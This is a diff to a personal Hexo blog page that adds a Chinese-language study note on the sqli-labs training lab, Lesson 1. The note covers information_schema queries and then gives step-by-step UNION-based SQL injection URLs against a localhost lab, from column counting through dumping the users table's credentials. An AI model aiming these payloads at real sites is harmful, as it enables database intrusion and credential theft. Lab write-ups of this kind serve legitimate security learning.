@@ -246,6 +246,72 @@
 
 
   
+    <article id="post-sqlilab-lesson1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/13/sqlilab-lesson1/">sqlilab lesson1</a>
+    </h1>
+  
+
+        
+        <a href="/2022/01/13/sqlilab-lesson1/" class="archive-article-date">
+  	<time datetime="2022-01-13T08:24:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-13</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="sqlilab-lesson1"><a href="#sqlilab-lesson1" class="headerlink" title="sqlilab lesson1"></a>sqlilab lesson1</h1><h2 id="sqlilab-基本用法（重要）"><a href="#sqlilab-基本用法（重要）" class="headerlink" title="sqlilab 基本用法（重要）"></a>sqlilab 基本用法（重要）</h2><p>查库:select schema_name from information_schema.schemate；（information库中包含了所有数据库）<br>查表：select table_name from information_schema.tables where table_schema=’security’；（where语句找security库中的表）<br>查列：select column_name from information_schema.columns where table_name=’users’；（where语句找users中的列信息）<br>查字段:select username,password from security.users；（select列信息from 库名.表名）</p>
+<h2 id="less-01-（基础知识）"><a href="#less-01-（基础知识）" class="headerlink" title="less-01:（基础知识）"></a>less-01:（基础知识）</h2><p>select * from users where id=’1’ limit 0,1;<br>select * from users limit 0,1;<br>limit 0,1;(逗号前一位表示第一位从第几开始，例如0表示从第一个开始，逗号后表示的时显示数据的个数)</p>
+<p>select * from users where id=’1’ or 1=1–+ ‘limit 0,1;<br>–+ –(空格) # （表示注释符，代表后面的语句不再进行执行）<br>or and<br>A and B(若A正确且B正确返回则是正确)<br>A or B（A或B其中之一正确则返回为正确）<br>select * from users order by 1(对于第一列数据进行排序，可用于判断数据的总共的列数)<br>select * from users where id=-1’ union select 1,2,3–+(id=1报错否则会显示id=1的信息)<br>union select 1,2,3–+(联合查询，查询可使用的信息所在列数)<br>函数group_concat()括号内为要连接的字段<br>常用函数<br>user()<br>database()<br>@@version<br>session_user()<br>@@basedir<br>@@datadir<br>@@version_compile_os</p>
+<h2 id="less-01-操作步骤"><a href="#less-01-操作步骤" class="headerlink" title="less-01(操作步骤)"></a>less-01(操作步骤)</h2><p>1、查看是否报错，判断是否可注入（hackbar中）<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;</a><br>2、判断列数<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;</a> order by 3–+<br>可用二分法<br>3、判断哪些可回显<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2,3–+<br>4、查看当前数据库<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2,database()–+<br>5、查看所有数据库<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(schema_name) from information_schema.schemata–+<br>得到information_schema,challenges,mysql,performance_schema,security,test<br>6、查看此库中的所有表<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+<br>得到emails,referers,uagents,users<br>7、查看users表中的列信息<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+<br>得到id,username,password<br>8、查看所有字段<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(concat_ws (‘<del>‘,username,password) )from security.users–+<br>得到Dumb</del>Dumb,Angelina<del>I-kill-you,Dummy</del>p@ssword,secure<del>crappy,stupid</del>stupidity,superman<del>genious,batman</del>mob!le,admin<del>admin,admin1</del>admin1,admin2<del>admin2,admin3</del>admin3,dhakkan<del>dumbo,admin4</del>admin4 （其中“~”最好表示为十六进制数0x7e）</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/13/sqlilab-lesson1/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-My-New-Post" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -393,7 +459,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2021 John Doe
+    		&copy; 2022 John Doe
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
